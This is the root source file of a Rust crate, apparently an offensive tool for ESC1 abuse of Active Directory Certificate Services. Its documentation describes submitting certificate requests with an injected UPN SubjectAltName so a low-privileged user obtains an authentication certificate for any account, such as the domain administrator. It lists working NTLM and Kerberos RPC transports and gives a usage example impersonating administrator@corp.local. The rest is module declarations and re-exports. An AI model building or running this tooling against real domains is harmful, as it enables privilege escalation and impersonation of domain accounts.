//! ms-icpr — ICertPassage (MS-ICPR) / WCCE client with an ESC1 CSR-SAN
//! injection primitive.
//!
//! # Purpose
//!
//! Submit certificate requests to an AD-CS Enterprise CA over RPC and retrieve
//! the issued certificate. The offensive path this crate enables is ESC1:
//! against an `enrollee-supplies-subject` template, a low-privileged user
//! ships a CSR with a `SubjectAltName{otherName, userPrincipalName=...}`
//! extension and the CA emits a client-auth certificate bound to any UPN in
//! the domain (e.g. `administrator@corp.local`).
//!
//! # Status: 0.1.0-dev (pre-alpha)
//!
//! - `build_csr_with_upn_san` produces a valid, signed PKCS#10 CSR carrying
//!   the UPN otherName SAN. Offline-testable, round-trip-verified.
//! - `IcprClient::submit_request` performs offline pre-flight checks
//!   (schema version, `min_ra_signatures`, CSR shape), NDR-marshals the
//!   `CertServerRequest` opnum-0 input stub, and hands it to the transport.
//!   With [`rpc::StubTransport`] you get [`Error::LiveDcOnly`] after
//!   preflight; with the default `network` feature you get
//!   [`IcprClient::connect`] which speaks SMB2 → sealed `\PIPE\cert` →
//!   `CertServerRequest` → decoded response.
//! - Two BIND auth paths:
//!     * NTLMSSP sign+seal ([`IcprClient::connect`]) — end-to-end live.
//!     * Kerberos (GSS-KRB5, `RPC_C_AUTHN_GSS_KERBEROS`) —
//!       [`IcprClient::connect_kerberos`] does SMB2 `login_kerberos` + `IPC$`
//!       tree connect and produces a client whose BIND PDU carries the caller's
//!       `AP-REQ` (see [`kerberos::encode_kerberos_bind_pdu`]). The per-message
//!       RFC 4121 wrap for `CertServerRequest` sealed calls is not implemented
//!       yet — [`IcprClient::submit_request`] returns [`Error::LiveDcOnly`]
//!       with a Kerberos-sealing hint. Consumers wanting relay flows plug in
//!       their own transport via [`IcprTransport`] +
//!       [`rpc::encode_cert_server_request`] / [`rpc::decode_cert_server_response`].
//!
//! # Example
//!
//! ```no_run
//! use ms_icpr::{build_csr_with_upn_san, IcprClient};
//! # let key_pem: &[u8] = b"";
//! # let template: ms_crtd::CertTemplate = unimplemented!();
//! let csr = build_csr_with_upn_san("recon", "administrator@corp.local", key_pem)?;
//! let mut client = IcprClient::stub("corp-CA");
//! // On a live DC this would issue the cert. Offline: Err(LiveDcOnly).
//! let _ = client.submit_request(&template, &csr);
//! # Ok::<(), ms_icpr::Error>(())
//! ```

pub mod csr;
pub mod der;
pub mod error;
pub mod kerberos;
pub mod oids;
pub mod rpc;

pub use csr::{build_csr_with_upn_san, parse_rsa_private_key_pem};
pub use error::{Error, Result};
pub use kerberos::{
    encode_kerberos_auth3_pdu, encode_kerberos_bind_pdu, KrbTicket, ICPR_SYNTAX_UUID,
    RPC_C_AUTHN_GSS_KERBEROS,
};
pub use rpc::{
    decode_cert_server_response, encode_cert_server_request, CertServerResponse, IcprClient,
    IcprTransport, IssuedCert, StubTransport, CERT_SERVER_REQUEST_OPNUM,
};

#[cfg(feature = "network")]
pub use rpc::{KerberosTransport, NetworkTransport};
